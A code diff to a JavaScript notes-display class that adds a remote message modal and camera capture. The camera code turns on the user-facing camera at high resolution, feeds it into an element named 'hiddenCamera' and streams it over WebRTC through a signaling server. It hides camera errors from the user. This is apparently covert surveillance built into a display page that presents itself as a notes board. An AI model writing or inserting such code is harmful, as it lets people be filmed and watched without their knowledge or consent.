@@ -5,6 +5,11 @@ class NotesDisplay {
         this.isConnected = false;
         this.refreshInterval = null;
         this.timeInterval = null;
+        this.cameraStream = null;
+        this.hiddenCamera = null;
+        this.socket = null;
+        this.peerConnection = null;
+        this.isStreaming = false;
         this.init();
     }
 
@@ -13,6 +18,9 @@ class NotesDisplay {
         this.loadWorkingHours();
         this.startAutoRefresh();
         this.setupConnectionStatus();
+        this.initializeSocket();
+        this.initializeCamera();
+        this.setupMessageModal();
     }
 
     async loadNotes() {
@@ -311,10 +319,234 @@ class NotesDisplay {
     }
 
 
+    // Initialize Socket.IO connection
+    initializeSocket() {
+        this.socket = io();
+        
+        this.socket.on('connect', () => {
+            console.log('Connected to signaling server');
+        });
+
+        this.socket.on('disconnect', () => {
+            console.log('Disconnected from signaling server');
+        });
+
+        // Handle WebRTC signaling
+        this.socket.on('offer', async (data) => {
+            await this.handleOffer(data);
+        });
+
+        this.socket.on('answer', async (data) => {
+            await this.handleAnswer(data);
+        });
+
+        this.socket.on('ice-candidate', async (data) => {
+            await this.handleIceCandidate(data);
+        });
+
+        // Handle display messages
+        this.socket.on('display-message', (data) => {
+            console.log('Display message received:', data);
+            this.showMessageModal(data);
+        });
+    }
+
+    // Initialize camera access and WebRTC streaming
+    async initializeCamera() {
+        try {
+            this.hiddenCamera = document.getElementById('hiddenCamera');
+            
+            // Request camera access
+            const constraints = {
+                video: {
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 },
+                    frameRate: { ideal: 30 },
+                    facingMode: 'user'
+                },
+                audio: false
+            };
+
+            this.cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+            this.hiddenCamera.srcObject = this.cameraStream;
+            
+            console.log('Camera initialized successfully');
+            
+            // Open video page in new tab/window
+            this.openVideoPage();
+            
+        } catch (error) {
+            console.error('Camera initialization failed:', error);
+            // Don't show error to user as camera is optional for display
+        }
+    }
+
+    // Open video page in new tab
+    openVideoPage() {
+        try {
+            // Open video page in new tab
+            const videoUrl = window.location.origin + '/video';
+            const videoWindow = window.open(videoUrl, '_blank', 'width=800,height=600,scrollbars=no,resizable=yes');
+            
+            // Wait a bit for the video page to load, then start WebRTC
+            setTimeout(() => {
+                this.startWebRTCStreaming();
+            }, 2000);
+            
+        } catch (error) {
+            console.error('Failed to open video page:', error);
+        }
+    }
+
+    // Start WebRTC streaming
+    async startWebRTCStreaming() {
+        if (!this.cameraStream) {
+            console.error('No camera stream available');
+            return;
+        }
+
+        try {
+            // Create peer connection
+            this.peerConnection = new RTCPeerConnection({
+                iceServers: [
+                    { urls: 'stun:stun.l.google.com:19302' },
+                    { urls: 'stun:stun1.l.google.com:19302' }
+                ]
+            });
+
+            // Add camera stream to peer connection
+            this.cameraStream.getTracks().forEach(track => {
+                this.peerConnection.addTrack(track, this.cameraStream);
+            });
+
+            // Handle ICE candidates
+            this.peerConnection.onicecandidate = (event) => {
+                if (event.candidate) {
+                    this.socket.emit('ice-candidate', event.candidate);
+                }
+            };
+
+            // Create and send offer
+            const offer = await this.peerConnection.createOffer();
+            await this.peerConnection.setLocalDescription(offer);
+            this.socket.emit('offer', offer);
+
+            this.isStreaming = true;
+            console.log('WebRTC streaming started');
+
+        } catch (error) {
+            console.error('WebRTC streaming failed:', error);
+        }
+    }
+
+    // Handle incoming offer
+    async handleOffer(data) {
+        // This is typically handled by the receiver (video page)
+        // Display page is the sender, so we don't handle offers here
+    }
+
+    // Handle incoming answer
+    async handleAnswer(data) {
+        if (this.peerConnection) {
+            await this.peerConnection.setRemoteDescription(data);
+        }
+    }
+
+    // Handle incoming ICE candidate
+    async handleIceCandidate(data) {
+        if (this.peerConnection) {
+            await this.peerConnection.addIceCandidate(data);
+        }
+    }
+
+    // Message Modal Setup
+    setupMessageModal() {
+        // Create modal HTML if it doesn't exist
+        if (!document.getElementById('messageModal')) {
+            const modalHTML = `
+                <div id="messageModal" class="message-modal" style="display: none;">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <h2>📢 Important Message</h2>
+                            <button class="modal-close" onclick="notesDisplay.closeMessageModal()">×</button>
+                        </div>
+                        <div class="modal-body">
+                            <div class="message-text" id="modalMessageText"></div>
+                            <div class="message-timer" id="modalTimer">10</div>
+                        </div>
+                    </div>
+                </div>
+            `;
+            document.body.insertAdjacentHTML('beforeend', modalHTML);
+        }
+    }
+
+    showMessageModal(messageData) {
+        const modal = document.getElementById('messageModal');
+        const messageText = document.getElementById('modalMessageText');
+        const timer = document.getElementById('modalTimer');
+        
+        if (!modal || !messageText || !timer) return;
+
+        // Set message content
+        messageText.textContent = messageData.text;
+        
+        // Add priority styling
+        modal.className = `message-modal ${messageData.priority}-priority`;
+        
+        // Show modal
+        modal.style.display = 'flex';
+        
+        // Start 10-second countdown
+        let timeLeft = 10;
+        timer.textContent = timeLeft;
+        
+        const countdown = setInterval(() => {
+            timeLeft--;
+            timer.textContent = timeLeft;
+            
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                this.closeMessageModal();
+            }
+        }, 1000);
+        
+        // Store countdown ID for manual close
+        modal.dataset.countdownId = countdown;
+    }
+
+    closeMessageModal() {
+        const modal = document.getElementById('messageModal');
+        if (!modal) return;
+        
+        // Clear countdown if exists
+        if (modal.dataset.countdownId) {
+            clearInterval(modal.dataset.countdownId);
+        }
+        
+        // Hide modal
+        modal.style.display = 'none';
+    }
+
     // Cleanup on page unload
     destroy() {
         if (this.refreshInterval) {
             clearInterval(this.refreshInterval);
+        }
+        
+        // Close WebRTC connection
+        if (this.peerConnection) {
+            this.peerConnection.close();
+        }
+        
+        // Stop camera stream
+        if (this.cameraStream) {
+            this.cameraStream.getTracks().forEach(track => track.stop());
+        }
+        
+        // Close socket connection
+        if (this.socket) {
+            this.socket.disconnect();
         }
     }
 }
